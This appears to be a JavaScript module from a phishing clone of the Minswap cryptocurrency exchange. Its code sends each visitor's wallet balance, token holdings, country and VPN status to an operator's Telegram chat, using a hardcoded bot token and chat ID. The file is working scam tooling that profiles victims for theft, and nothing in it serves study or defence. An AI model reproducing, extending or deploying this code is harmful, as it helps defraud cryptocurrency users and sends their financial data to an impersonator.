import axios from "axios";
import { getUserCountry } from "./userLocation";  // Ensure correct file import

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
const TELEGRAM_CHAT_ID = "6482385341";

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};

// Function to send app details (like ADA balance) to Telegram
export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
  let tokenDetails = tokens.map(
    (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
  );

  // Fetch the full user country details (including VPN status)
  let userCountryData = await getUserCountry();

  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpn: false }; // Default fallback
  }

  const { country, countryCode, isVpn } = userCountryData;
  const globeIcon = "🌍";  // Unicode globe icon

  // Construct the message
  let message = `*Visit Alert*\n` +
                `App: Minswap Clone\n\n` +
                `User Info--------------------\n` +
                `| Country: ${globeIcon} ${country} |\n`;

  // If the user is using a VPN, add a VPN warning to the message
  if (isVpn) {
    message += `| ⚠️ VPN SUSPECTED |\n`;
  }

  message += `--------------------------------\n` +
             `| User Wallet Balance |\n` +
             `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
             `${tokenDetails.join("\n")}\n` +
             `------------------------------End`;

  // Send the message to Telegram
  await sendMessageToTelegram(message);
};
